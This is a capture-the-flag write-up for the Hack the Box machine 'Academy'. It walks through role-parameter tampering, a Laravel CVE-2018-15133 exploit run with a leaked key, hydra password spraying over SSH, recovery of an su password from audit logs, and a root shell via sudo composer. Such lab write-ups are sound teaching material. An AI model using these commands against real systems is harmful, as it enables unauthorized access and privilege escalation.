---
description: Writeup for Academy from Hack the Box
---

# Academy

`nmap -sV -T4 -p- 10.10.10.215`

```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx?

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

Navigating to [http://10.10.10.215](http://10.10.10.215) redirects to an unknown host [http://academy.htb/](http://academy.htb/).

Add an entry to the hosts file at `/etc/hosts`, to resolve the `academy.htb` domain to 10.10.10.215.

![](../../.gitbook/assets/2f72f94658284798865ecddb779711db.png)

Now it works and we can see the website properly.

`gobuster dir -u http://academy.htb/ -w /usr/share/dirb/wordlists/common.txt`

![](../../.gitbook/assets/15c9503ba0004faf82d3b692563ad53f.png)

There was a registration page and a login page, so I went ahead and registered with credentials test:test.

![](../../.gitbook/assets/ce40b655d79744c2b435078d98a8323f.png)

**Always look at what you are POST-ing!**

When registering, there is a `roleid` parameter.

![](../../.gitbook/assets/62a4c3cfbb4547159ebd1f947e137abc.png)

So, let's try to create _another_ account, changing the roleid from 0 to 1.

![](../../.gitbook/assets/1507f4fbcbae4e779e60bc95c330780d.png)

This gives us admin privileges. From the previously found `/admin.php`, we can login:

![](../../.gitbook/assets/2483b0aaca5347be96bc486a531f431a.png)

Crucial information! Let's add `dev-staging-01.academy.htb` to our `/etc/hosts` file.

![](../../.gitbook/assets/3b57adc2cf0d4962816de581822dde68.png)

The site:

![](../../.gitbook/assets/a83e981a3f694d439f2f67bb876839f7.png)

The site uses Laravel. API key: `dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=`

![](../../.gitbook/assets/179a3fc2613b4dad93e4d4c442a4ffc0.png)

There is a MySQL username and password combination. However, trying to authenticate remotely into the MySQL server failed.

Googling will tell us several CVEs associated with Laravel.

Found this neat tool for exploiting CVE-2018-15133: [https://github.com/aljavier/exploit\_laravel\_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

CVE-2018-15133 is an RCE vulnerability that requires us to know the APP\_NAME \(API token\). From the information above, we have found the APP\_NAME!

Run the exploit:

`python3 pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive`

Note that we should be using `dev-staging-01.academy.htb` as the target URI because the Laravel is running on this domain.

![](../../.gitbook/assets/87684c098d944a0e9ad83ff67d2a97df.png)

Get some basic information:

![](../../.gitbook/assets/9f11adaf245344538d1c2f03cac8cd7f.png)

## Privilege Escalation

The `.env` file stores the environment variables.

![](../../.gitbook/assets/0691823efee44df09e6a2c0e504037ab.png)

![](../../.gitbook/assets/9a81ae90a51a41588c055a24702a1832.png)

Find the regular users \(those with `/home/<username>`\):

![](../../.gitbook/assets/190c61d4199b4353b0794481df0adc3c.png)

We want to enumerate these users to check if any of them used the same password for their user account as the mysql account \(password spraying attack\)

![](../../.gitbook/assets/b774a3e704ee44bfae4f772ce34228ba.png)

`hydra -L users.txt -p mySup3rP4s5w0rd\!\! -v ssh://10.10.10.215`

* Note that `!!` is a feature in Bash which re-executes the previous command.
* This is why the `!!` needs to be escaped, i.e. `\!\!`

![](../../.gitbook/assets/d2fbe58fac8c4b03ab58a4cde907ca95.png)

`ssh 10.10.10.215 -l cry0l1t3` and use the `mySup3rP4s5w0rd!!` password.

![](../../.gitbook/assets/ecf0a5341ca14fe49730382eacae8fbf.png)

**User Flag:**

![](../../.gitbook/assets/bb1de51134a94a4dae5cbf2695057c16.png)

Upgrade to tty shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

![](../../.gitbook/assets/848ea9a1779f4c1494a3048c7a16a6b2.png)

A handy thing to check for is user groups. I don't have sufficient privileges, but maybe someone else does? So, egre55 is in the same group `adm` as us, but he is also in other groups such as `sudo`.

![](../../.gitbook/assets/802178e4db6c4e08b979eb7cb671d1f7.png)

I tried `grep` to find credentials for egree55 to no avail.

### /var/log/audit

The audit logs contain a field

`comm="<command name>"`

The comm field records the command-line name of the command that was used to invoke the analyzed process. In this case, the cat command was used to trigger this Audit event.

So we can look for `comm="su"` in the audit logs.

`grep -r 'comm="su"' /var/log/audit`

![](../../.gitbook/assets/3da36fd1f4374792bcaba8d960e491d8.png)

The `data` field is the supplied user input, in _hexadecimal_. We need to convert to ASCII.

![](../../.gitbook/assets/12a8b6bed1474538adf8658f8d03bac1.png)

Now we can login as mrb3n.

```text
ssh 10.10.10.215 -l mrb3n
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### sudo -l

`sudo -l` shows us which commands that we are allowed to run as `sudo`, i.e. `root`. Sudo allows users to run _some_ commands as root. Using `sudo -l` we can find out which commands these are.

![](../../.gitbook/assets/4eb805da3bf648e1afd6fc5b69336d14.png)

### GTFO

Great resource to find info on binaries that can be used to elevate privileges! These are all _legitimate_ functions of binaries that can be exploited _given there are misconfigurations_.

[https://gtfobins.github.io/](https://gtfobins.github.io/)

Here we can find info on what we can do when we have `sudo`:

![](../../.gitbook/assets/42c271f82e38419c8a9ef6e90db99850.png)

So just run the commands given!

```bash
mrb3n@academy:~$ TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
```

We should get a root shell! There's an `academy.txt` easter egg as well.

![](../../.gitbook/assets/fe56bd06bbbf4e218ced184e6d82e911.png)

